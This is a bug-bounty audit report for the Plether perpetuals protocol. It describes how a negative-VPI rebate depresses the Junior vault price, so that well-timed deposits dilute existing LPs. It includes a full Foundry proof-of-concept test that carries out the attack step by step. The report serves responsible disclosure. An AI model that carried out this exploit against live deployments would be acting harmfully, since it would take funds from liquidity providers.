# \#99420 [SC-Critical] Negative-VPI rebates let new Junior deposits capture value from existing LPs

**Submitted on Nov 13th 2026 at 15:53:29 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99420
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
A trader who reduces existing skew receives a negative-VPI rebate from the pool and must lock a matching reserve in the clearinghouse. The rebate immediately lowers the Junior share price, but the reserved amount due back when the position closes is omitted from the price used to activate Junior deposits. An attacker can deposit during that dip, receive extra shares, close with the basket's mid price unchanged, and withdraw after the rebate is recovered. In the attached test, this leaves the attacker's wallet **1,738.781076 USDG ahead** of an otherwise identical deposit and reduces an existing Junior LP's funded redemption. The attack requires an unrelated position supplying the initial skew and an exit before that position closes.

## Vulnerability Details
The tested pool begins with 3.9 million USDG in Senior, 1.1 million USDG held by an existing Junior LP, and an unrelated Short near the 40% skew limit. The attacker requests a 4 million USDG Junior deposit. Just before its activation epoch, the attacker opens a Long that reduces the Short skew by 75%. The open pays a **3,748.501199 USDG** negative-VPI rebate from `HousePool` and locks negative-VPI backing in the attacker's clearinghouse account.

This cash movement and reserve are handled in `CfdEnginePlanLib.planOpen` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:331-349`) and `CfdEngineSettlementSidecar.executeOpen` (`packages/perps/src/CfdEngineSettlementSidecar.sol:442-478`). The reserve is protected against ordinary spending (`packages/perps/src/MarginClearinghouse.sol:975-984,1655-1667`). On a full close, the lifetime clamp prevents the position's VPI from ending negative, and close settlement can consume the reserve or withhold the charge from a gain (`packages/perps/src/libraries/CloseAccountingLib.sol:112-118`; `packages/perps/src/libraries/CfdEnginePlanLib.sol:1041-1058`). In the tested close with an unchanged basket mid price, the rebate is recovered economically.

Junior deposit pricing sees only the temporary cash dip. `CfdEngineProtocolLens.getHousePoolInputSnapshot` supplies pool assets, marked price PnL and trader claims, without the negative-VPI reserve (`packages/perps/src/CfdEngineProtocolLens.sol:62-72`). `HousePoolAccountingLib.buildReconcileSnapshot` uses those inputs to set distributable NAV (`packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78`). `HousePool._settleLpEpoch` then reconciles Junior principal and quotes deposit shares from that principal (`packages/perps/src/HousePool.sol:824-835,914-922,1030-1048`). The deposit therefore mints more shares than the same deposit without the rebate position. When the Long closes, the pool recovers the rebate, and those extra shares take part in the recovery at the expense of existing Junior shares.

The attacker closes without a change in the basket's mid price, waits out the Junior deposit cooldown, and uses public LP settlement to fund and withdraw the shares. No privileged action is needed during the attack. The release six-currency basket and release risk parameters are used in the test setup; USDG and Pyth updates are mocked.

## Impact Details
The attached test compares the attack with a branch from the same state in which the same 4 million USDG deposit activates without the attacker's Long:

| After funded exit | Control | Attack | Difference |
|---|---:|---:|---:|
| Attacker's final wallet | 4,049,944.169687 USDG | 4,051,682.950763 USDG | **+1,738.781076 USDG** |
| Existing Junior's remaining share value | 1,103,911.364151 USDG | 1,100,974.770926 USDG | **−2,936.593225 USDG** |
| Later funded redemption of the same fixed slice of existing Junior shares | 34,495.005470 USDG | 34,403.236932 USDG | **−91.768538 USDG paid** |

The attacker pays trading fees, so the existing LP's total loss is larger than the attacker profit. The Senior tranche has the same value in both branches at the first post-close reconciliation. A second cycle reusing the first cycle's proceeds, with no further USDG minted, leaves the attacker **3,480.970792 USDG** ahead of its two-cycle control.

At the release oracle's maximum accepted basket confidence of **10 bps**, a separate test still shows **1,280.944035 USDG** more in the attacker's wallet after a funded exit (4,051,225.113722 versus 4,049,944.169687). The same fixed incumbent share slice redeems for **77.474117 fewer USDG** (34,417.531353 versus 34,495.005470).

This is a timed, capital-intensive extraction, not a claim that every negative-VPI trade is profitable. The PoC keeps basket mid prices unchanged and mocks oracle updates; its base case uses zero confidence and the second case reaches the accepted 10-bps ceiling. A profitable version in which the attacker also creates the initial skew has not been demonstrated. The attacker exits while the unrelated Short remains open; if that Short closes first, its own positive-VPI refund changes the result.

The earlier report #98024 concerns a **skew-increasing** trade that pays positive VPI **into** HousePool. That receipt raises Junior NAV even though a later close can refund it. Its exploitable LP action is a **redemption at an inflated price**. This report concerns a **skew-reducing** trade that takes a rebate **out of** HousePool while a matching amount is protected in the clearinghouse. Its exploitable LP action is a **deposit at a depressed price**. Subtracting refundable positive VPI from NAV, as proposed for the earlier report, does not price this reserve-backed negative-VPI receivable into a new deposit and therefore does not stop this path.

Both reports touch the VPI/NAV accounting boundary; they should not be mistaken for unrelated code paths. `SECURITY.md` explicitly says the negative-VPI reserve is excluded from symmetric NAV so it cannot fund an exit before collection (`packages/perps/SECURITY.md:849-876`). That protects redemption liquidity, but it does not address the extra shares minted when a deposit is activated during the rebate interval. A correction needs to account for the recoverable amount in **entry pricing** without making the reserve withdrawable before settlement.

## Proof of Concept

## Proof of Concept

Attach the single file **`NegativeVpiRebateDepositDilution.t.sol`**. Place it at `packages/perps/test/poc/NegativeVpiRebateDepositDilution.t.sol` in the competition checkout and run from the repository root:

```sh
forge test --root packages/perps --offline --match-path 'test/poc/NegativeVpiRebateDepositDilution.t.sol' -vv
```

The file imports the repository's existing `BasePerpTest` and mock USDG/Pyth utilities. It does not alter any in-scope contract. It commits and executes orders through the V3 Router, settles LP epochs through the public Router entry point, and checks wallet token balances after funded withdrawals. The verified run passed **6 tests, 0 failed**. The key tests compare same-state attack and control branches, redeem a fixed slice of the incumbent's shares in both branches, repeat at maximum accepted basket confidence, reuse capital for a second cycle, and show that a depositor can benefit when an unrelated trader opens the rebate position before settlement.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Single-file PoC for negative-VPI Junior deposit dilution and realized exits.
contract NegativeVpiRebateDepositDilution is BasePerpTest {

    address internal constant HONEST_JUNIOR = address(0x711);
    address internal constant SENIOR = address(0x512);
    address internal constant ORGANIC_SHORT = address(0x503);
    address internal constant ATTACKER = address(0xA77AC4);
    address internal constant PASSIVE_TRADER = address(0xA11CE);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant ATTACKER_DEPOSIT = 4_000_000e6;
    uint256 internal constant ORGANIC_MARGIN = 20_000e6;
    uint256 internal constant ATTACKER_MARGIN = 15_000e6;
    uint64 internal eurConfidence;

    bytes32 internal constant EUR = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
    bytes32 internal constant JPY = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
    bytes32 internal constant GBP = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
    bytes32 internal constant CAD = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
    bytes32 internal constant SEK = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
    bytes32 internal constant CHF = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;

    struct Outcome {
        uint256 shares;
        uint256 attackerWealth;
        uint256 honestJuniorValue;
        uint256 seniorValue;
        uint256 treasuryBalance;
        uint256 poolBeforeOpen;
        uint256 poolAfterOpen;
        uint256 poolAfterClose;
        uint256 rebateReserveAtOpen;
        uint256 rebateReserveAtClose;
        uint256 rebate;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        PletherOracle releaseOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), _feedIds(), _weights(), _bases(), _inversions()
        );
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.minOpenNotionalAssets = 1000e6;
        routerAdmin.proposeRouterConfig(routerConfig);
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        uint256 activation = vm.getBlockTimestamp() + 72 hours + 1;
        if (pool.poolConfigActivationTime() > activation) {
            activation = pool.poolConfigActivationTime();
        }
        if (routerAdmin.oracleConfigActivationTime() > activation) {
            activation = routerAdmin.oracleConfigActivationTime();
        }
        vm.warp(activation);
        routerAdmin.finalizeRouterConfig();
        routerAdmin.finalizeOracleConfig();
        pool.finalizePoolConfig();
        pletherOracle = releaseOracle;
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);

        _fundJunior(HONEST_JUNIOR, 1_100_000e6);
        _fundSenior(SENIOR, 3_900_000e6);
        _fundTrader(ORGANIC_SHORT, 50_000e6);
        _fundTrader(ATTACKER, 50_000e6);
        _refreshMark();
        uint256 lots = _maxOpenLots(ORGANIC_SHORT, CfdTypes.Side.SHORT, ORGANIC_MARGIN);
        assertGt(lots, 10_000, "organic skew must be material");
        _execute(ORGANIC_SHORT, CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, ORGANIC_MARGIN, false);
        _refreshMark();
    }

    function _livePriceData() internal view returns (bytes[] memory data) {
        return _priceData(uint64(vm.getBlockTimestamp()), uint64(engine.lastMarkTime()));
    }

    function _priceData(uint64 tick, uint64 previous) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _feedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        uint256[] memory bases = _bases();
        for (uint256 i; i < ids.length; ++i) {
            uint256 raw = i == 1 || i == 3 || i == 4 || i == 5 ? 1e16 / bases[i] : bases[i];
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(raw)), i == 0 ? eurConfidence : 0, -8, tick, previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _refreshMark() internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_livePriceData());
    }

    function _execute(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close
    ) internal {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == close ? type(uint256).max : 1,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 id = router.commitOrder(request);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _priceData(uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1));
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        if (result.status != OrderV3Types.LifecycleStatus.Executed) {
            emit log_named_uint("order terminal reason", uint8(result.terminalReason));
        }
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _feedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = EUR;
        ids[1] = JPY;
        ids[2] = GBP;
        ids[3] = CAD;
        ids[4] = SEK;
        ids[5] = CHF;
    }

    function _weights() internal pure returns (uint256[] memory values) {
        values = new uint256[](6);
        values[0] = 0.576e18;
        values[1] = 0.136e18;
        values[2] = 0.119e18;
        values[3] = 0.091e18;
        values[4] = 0.042e18;
        values[5] = 0.036e18;
    }

    function _bases() internal pure returns (uint256[] memory values) {
        values = new uint256[](6);
        values[0] = 117_500_000;
        values[1] = 638_000;
        values[2] = 134_480_000;
        values[3] = 72_880_000;
        values[4] = 10_860_000;
        values[5] = 126_100_000;
    }

    function _inversions() internal pure returns (bool[] memory values) {
        values = new bool[](6);
        values[1] = true;
        values[3] = true;
        values[4] = true;
        values[5] = true;
    }

    function _maxOpenLots(
        address trader,
        CfdTypes.Side side,
        uint256 margin
    ) internal view returns (uint256) {
        uint256 lo;
        uint256 hi = 100_000;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            uint8 code;
            try engineLens.previewOpenRevertCode(trader, side, mid * CfdTypes.SIZE_QUANTUM, margin, PRICE) returns (
                uint8 result
            ) {
                code = result;
            } catch {
                code = type(uint8).max;
            }
            if (code == 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        return lo;
    }

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    function _attackerWealth() internal view returns (uint256) {
        return clearinghouse.balanceAssets(ATTACKER) + settlementToken.balanceOf(ATTACKER) + _juniorValue(ATTACKER);
    }

    function _cycle(
        bool attack
    ) internal returns (Outcome memory o) {
        uint256 epoch = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(epoch + 60);
        _refreshMark();
        // Initial funding is minted by the test fixture. Later cycles reuse proceeds
        // from the preceding funded redemption rather than minting fresh capital.
        uint256 wallet = settlementToken.balanceOf(ATTACKER);
        if (wallet < ATTACKER_DEPOSIT) {
            settlementToken.mint(ATTACKER, ATTACKER_DEPOSIT - wallet);
        }
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), ATTACKER_DEPOSIT);
        uint256 requestId = juniorVault.requestDeposit(ATTACKER_DEPOSIT, ATTACKER, ATTACKER);
        vm.stopPrank();
        uint256 maturity = pool.lpEpochStart(requestId);
        assertEq(maturity, epoch + 1 hours, "deposit should activate at next boundary");

        vm.warp(maturity - 120);
        _refreshMark();
        o.poolBeforeOpen = settlementToken.balanceOf(address(pool));
        if (attack) {
            // A prior funded exit moves the trader's remaining margin back to its
            // wallet. Re-deposit from those proceeds for a repeat attack.
            uint256 availableMargin = clearinghouse.balanceAssets(ATTACKER);
            if (availableMargin < 20_000e6) {
                uint256 topUp = 20_000e6 - availableMargin;
                vm.startPrank(ATTACKER);
                settlementToken.approve(address(clearinghouse), topUp);
                clearinghouse.depositMargin(topUp);
                vm.stopPrank();
            }
            (uint256 shortSize,,,,,,) = engine.positions(ORGANIC_SHORT);
            uint256 lots = shortSize / CfdTypes.SIZE_QUANTUM * 3 / 4;
            _execute(ATTACKER, CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, ATTACKER_MARGIN, false);
            (,,,,,, int256 vpi) = engine.positions(ATTACKER);
            assertLt(vpi, 0, "minority open receives negative VPI");
            o.rebate = uint256(-vpi);
            o.rebateReserveAtOpen = clearinghouse.vpiRebateReserveAssets(ATTACKER);
            assertGe(o.rebateReserveAtOpen, o.rebate);
        }
        o.poolAfterOpen = settlementToken.balanceOf(address(pool));

        vm.warp(maturity);
        vm.roll(vm.getBlockNumber() + 1);
        router.settleLpEpoch(_livePriceData());
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, ATTACKER);
        assertEq(claimable, ATTACKER_DEPOSIT);
        vm.prank(ATTACKER);
        o.shares = juniorVault.claimDeposit(requestId, claimable, ATTACKER, ATTACKER);
        if (attack) {
            (uint256 size,,,,,,) = engine.positions(ATTACKER);
            _execute(ATTACKER, CfdTypes.Side.LONG, size, 0, true);
            o.rebateReserveAtClose = clearinghouse.vpiRebateReserveAssets(ATTACKER);
            assertEq(o.rebateReserveAtClose, 0);
        }

        vm.warp(maturity + 60);
        _refreshMark();
        o.poolAfterClose = settlementToken.balanceOf(address(pool));
        o.attackerWealth = _attackerWealth();
        o.honestJuniorValue = _juniorValue(HONEST_JUNIOR);
        o.seniorValue = seniorVault.totalAssets();
        o.treasuryBalance = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
    }

    function test_NegativeVpiDepositDilutionAgainstNoTradeControl() public {
        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _cycle(false);
        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);
        Outcome memory attack = _cycle(true);

        emit log_named_decimal_uint("rebate paid on open", attack.rebate, 6);
        emit log_named_decimal_uint("control new Junior shares", control.shares, 6);
        emit log_named_decimal_uint("attack new Junior shares", attack.shares, 6);
        emit log_named_decimal_uint("control attacker wealth", control.attackerWealth, 6);
        emit log_named_decimal_uint("attack attacker wealth", attack.attackerWealth, 6);
        emit log_named_decimal_uint("control honest Junior value", control.honestJuniorValue, 6);
        emit log_named_decimal_uint("attack honest Junior value", attack.honestJuniorValue, 6);
        emit log_named_decimal_uint("control Senior value", control.seniorValue, 6);
        emit log_named_decimal_uint("attack Senior value", attack.seniorValue, 6);
        emit log_named_decimal_uint("control treasury balance", control.treasuryBalance, 6);
        emit log_named_decimal_uint("attack treasury balance", attack.treasuryBalance, 6);

        assertGt(attack.rebate, 0);
        assertLt(attack.poolAfterOpen, attack.poolBeforeOpen);
        assertGt(attack.poolAfterClose, attack.poolAfterOpen, "close returns reserved VPI to pool");
        assertGt(attack.shares, control.shares, "rebate lowered Junior deposit price");
        assertGt(attack.attackerWealth, control.attackerWealth, "attacker gains after fees");
        assertLt(attack.honestJuniorValue, control.honestJuniorValue, "honest Junior is diluted");
        assertGt(attack.treasuryBalance, control.treasuryBalance, "fees account for part of the Junior loss");
    }

    function _realizeExit() internal returns (uint256 paid) {
        uint256 unlock = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN() + 1;
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock);
        }
        _refreshMark();
        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER);
        assertGt(shares, 0);
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(requestId));
        vm.roll(vm.getBlockNumber() + 1);
        router.settleLpEpoch(_livePriceData());
        assertEq(juniorVault.maxRedeem(ATTACKER), shares, "redeem request must be fully funded");
        paid = juniorVault.maxWithdraw(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.withdraw(paid, ATTACKER, ATTACKER);
        uint256 traderBalance = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdrawMargin(traderBalance);
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "trader proceeds reach wallet");
    }

    function test_NegativeVpiDepositDilutionRealizedExit() public {
        uint256 snapshot = vm.snapshotState();
        _cycle(false);
        uint256 controlPaid = _realizeExit();
        uint256 controlWealth = settlementToken.balanceOf(ATTACKER);
        uint256 controlHonestValue = _juniorValue(HONEST_JUNIOR);
        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);

        _cycle(true);
        uint256 attackPaid = _realizeExit();
        uint256 attackWealth = settlementToken.balanceOf(ATTACKER);
        uint256 attackHonestValue = _juniorValue(HONEST_JUNIOR);
        (uint256 organicSize,,,,,,) = engine.positions(ORGANIC_SHORT);

        emit log_named_decimal_uint("control realized Junior withdrawal", controlPaid, 6);
        emit log_named_decimal_uint("attack realized Junior withdrawal", attackPaid, 6);
        emit log_named_decimal_uint("control attacker final tokens", controlWealth, 6);
        emit log_named_decimal_uint("attack attacker final tokens", attackWealth, 6);
        emit log_named_decimal_uint("control honest Junior final value", controlHonestValue, 6);
        emit log_named_decimal_uint("attack honest Junior final value", attackHonestValue, 6);
        assertGt(organicSize, 0, "organic position remains open");
        assertGt(attackWealth, controlWealth, "attacker realizes token profit before organic close");
        assertLt(attackHonestValue, controlHonestValue, "incumbent Junior absorbs the loss");
    }

    function _redeemHonestTranche(
        uint256 shares
    ) internal returns (uint256 paid) {
        uint256 epoch = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(epoch + 60);
        _refreshMark();
        assertGe(juniorVault.maxRequestRedeem(HONEST_JUNIOR), shares);
        vm.prank(HONEST_JUNIOR);
        uint256 requestId = juniorVault.requestRedeem(shares, HONEST_JUNIOR, HONEST_JUNIOR);
        vm.warp(pool.lpEpochStart(requestId));
        vm.roll(vm.getBlockNumber() + 1);
        router.settleLpEpoch(_livePriceData());
        assertEq(juniorVault.claimableRedeemRequest(requestId, HONEST_JUNIOR), shares);
        uint256 walletBefore = settlementToken.balanceOf(HONEST_JUNIOR);
        vm.prank(HONEST_JUNIOR);
        paid = juniorVault.claimRedeem(requestId, shares, HONEST_JUNIOR, HONEST_JUNIOR);
        assertEq(settlementToken.balanceOf(HONEST_JUNIOR) - walletBefore, paid);
    }

    function test_HonestJuniorReceivesLessUsdgAfterAttackerExit() public {
        uint256 fixedShares = juniorVault.balanceOf(HONEST_JUNIOR) / 32;
        uint256 snapshot = vm.snapshotState();
        _cycle(false);
        _realizeExit();
        uint256 controlPaid = _redeemHonestTranche(fixedShares);
        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);

        _cycle(true);
        _realizeExit();
        uint256 attackPaid = _redeemHonestTranche(fixedShares);

        emit log_named_decimal_uint("control honest Junior USDG received", controlPaid, 6);
        emit log_named_decimal_uint("attack honest Junior USDG received", attackPaid, 6);
        assertLt(attackPaid, controlPaid, "same honest shares receive fewer USDG");
    }

    function test_TwoCyclesReuseCapitalAndDiluteIncumbent() public {
        uint256 snapshot = vm.snapshotState();
        _cycle(false);
        _realizeExit();
        assertGe(settlementToken.balanceOf(ATTACKER), ATTACKER_DEPOSIT);
        uint256 controlSupplyBeforeSecond = settlementToken.totalSupply();
        _cycle(false);
        assertEq(settlementToken.totalSupply(), controlSupplyBeforeSecond, "control reuses deposit capital");
        _realizeExit();
        uint256 controlWallet = settlementToken.balanceOf(ATTACKER);
        uint256 controlHonestValue = _juniorValue(HONEST_JUNIOR);

        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);
        _cycle(true);
        _realizeExit();
        uint256 firstAttackWallet = settlementToken.balanceOf(ATTACKER);
        assertGe(firstAttackWallet, ATTACKER_DEPOSIT, "second cycle can use first-cycle proceeds");
        uint256 attackSupplyBeforeSecond = settlementToken.totalSupply();
        _cycle(true);
        assertEq(settlementToken.totalSupply(), attackSupplyBeforeSecond, "attack reuses deposit capital");
        _realizeExit();
        uint256 attackWallet = settlementToken.balanceOf(ATTACKER);
        uint256 attackHonestValue = _juniorValue(HONEST_JUNIOR);

        emit log_named_decimal_uint("two-cycle control attacker wallet", controlWallet, 6);
        emit log_named_decimal_uint("two-cycle attack attacker wallet", attackWallet, 6);
        emit log_named_decimal_uint("two-cycle control honest Junior value", controlHonestValue, 6);
        emit log_named_decimal_uint("two-cycle attack honest Junior value", attackHonestValue, 6);
        assertGt(attackWallet, controlWallet, "two attacks net profitable after exit");
        assertLt(attackHonestValue, controlHonestValue, "incumbent loses across two cycles");
    }

    function _passiveDepositWithUnrelatedRebate(
        bool openBeforeSettlement
    ) internal returns (uint256 shares, uint256 finalWallet, uint256 honestValue) {
        uint256 epoch = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(epoch + 60);
        _refreshMark();
        settlementToken.mint(ATTACKER, ATTACKER_DEPOSIT);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), ATTACKER_DEPOSIT);
        uint256 requestId = juniorVault.requestDeposit(ATTACKER_DEPOSIT, ATTACKER, ATTACKER);
        vm.stopPrank();

        uint256 maturity = pool.lpEpochStart(requestId);
        vm.warp(maturity);
        _refreshMark();
        (uint256 shortSize,,,,,,) = engine.positions(ORGANIC_SHORT);
        uint256 lots = shortSize / CfdTypes.SIZE_QUANTUM * 3 / 4;
        uint256 longSize = lots * CfdTypes.SIZE_QUANTUM;
        if (openBeforeSettlement) {
            _execute(PASSIVE_TRADER, CfdTypes.Side.LONG, longSize, ATTACKER_MARGIN, false);
        }

        router.settleLpEpoch(_livePriceData());
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, ATTACKER);
        vm.prank(ATTACKER);
        shares = juniorVault.claimDeposit(requestId, claimable, ATTACKER, ATTACKER);
        if (!openBeforeSettlement) {
            _execute(PASSIVE_TRADER, CfdTypes.Side.LONG, longSize, ATTACKER_MARGIN, false);
        }

        vm.warp(maturity + 30 minutes);
        _refreshMark();
        (uint256 positionSize,,,,,,) = engine.positions(PASSIVE_TRADER);
        _execute(PASSIVE_TRADER, CfdTypes.Side.LONG, positionSize, 0, true);
        _realizeExit();
        finalWallet = settlementToken.balanceOf(ATTACKER);
        honestValue = _juniorValue(HONEST_JUNIOR);
    }

    function test_UnrelatedTraderRebateCanBenefitPassiveDepositor() public {
        _fundTrader(PASSIVE_TRADER, 50_000e6);
        uint256 snapshot = vm.snapshotState();
        (uint256 controlShares, uint256 controlWallet, uint256 controlHonest) = _passiveDepositWithUnrelatedRebate(false);
        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);
        (uint256 attackShares, uint256 attackWallet, uint256 attackHonest) = _passiveDepositWithUnrelatedRebate(true);

        emit log_named_decimal_uint("passive control shares", controlShares, 6);
        emit log_named_decimal_uint("passive before-settlement shares", attackShares, 6);
        emit log_named_decimal_uint("passive control wallet", controlWallet, 6);
        emit log_named_decimal_uint("passive before-settlement wallet", attackWallet, 6);
        emit log_named_decimal_uint("passive control honest Junior", controlHonest, 6);
        emit log_named_decimal_uint("passive before-settlement honest Junior", attackHonest, 6);
        assertGt(attackShares, controlShares, "entry during rebate buys more Junior shares");
        assertGt(attackWallet, controlWallet, "passive depositor has no trading fees yet profits");
        assertLt(attackHonest, controlHonest, "incumbent shares absorb passive windfall");
    }

    function test_MaxAcceptedBasketConfidenceWithRealizedExitAndIncumbentRedemption() public {
        // Only EUR carries confidence. Its direct weighted contribution lets us
        // set the aggregate basket confidence exactly at the release 10-bp cap.
        uint256 maxBps = pletherOracle.basketMaxConfidenceRatioBps();
        assertEq(maxBps, 10, "release confidence cap");
        uint256 basketPrice = pletherOracle.getLatestPrice();
        uint256 targetConfidence = basketPrice * maxBps / 10_000;
        uint256 rawEur = _bases()[0];
        uint256 weightedEur = (rawEur * _weights()[0]) / (rawEur * 1e10);
        uint256 maxRawConfidence = ((targetConfidence + 1) * rawEur - 1) / weightedEur;
        assertLt(maxRawConfidence, rawEur);
        assertGt((weightedEur * (maxRawConfidence + 1)) / rawEur, targetConfidence);
        eurConfidence = uint64(maxRawConfidence);
        _refreshMark();
        (, uint256 observedConfidence) = pletherOracle.getLatestPoolReconcilePrice();
        assertEq(observedConfidence, targetConfidence, "actual aggregate basket reaches cap");

        uint256 fixedShares = juniorVault.balanceOf(HONEST_JUNIOR) / 32;
        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _cycle(false);
        _realizeExit();
        uint256 controlWallet = settlementToken.balanceOf(ATTACKER);
        uint256 controlHonestPaid = _redeemHonestTranche(fixedShares);
        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);

        Outcome memory attack = _cycle(true);
        _realizeExit();
        uint256 attackWallet = settlementToken.balanceOf(ATTACKER);
        uint256 attackHonestPaid = _redeemHonestTranche(fixedShares);

        emit log_named_uint("EUR raw confidence at basket cap", maxRawConfidence);
        emit log_named_uint("aggregate basket price (8 decimals)", basketPrice);
        emit log_named_uint("aggregate basket confidence (8 decimals)", observedConfidence);
        emit log_named_decimal_uint("max-confidence rebate on open", attack.rebate, 6);
        emit log_named_decimal_uint("max-confidence control shares", control.shares, 6);
        emit log_named_decimal_uint("max-confidence attack shares", attack.shares, 6);
        emit log_named_decimal_uint("max-confidence control attacker wallet", controlWallet, 6);
        emit log_named_decimal_uint("max-confidence attack attacker wallet", attackWallet, 6);
        emit log_named_decimal_uint("max-confidence control incumbent redemption", controlHonestPaid, 6);
        emit log_named_decimal_uint("max-confidence attack incumbent redemption", attackHonestPaid, 6);
        assertGt(attack.rebate, 0, "skew-reducing open still pays a rebate");
        assertGt(attack.shares, control.shares, "temporary rebate still lowers deposit price");
        assertGt(attackWallet, controlWallet, "attacker realizes a wallet gain at maximum confidence");
        assertLt(attackHonestPaid, controlHonestPaid, "fixed incumbent shares redeem for fewer tokens");
    }

}
```
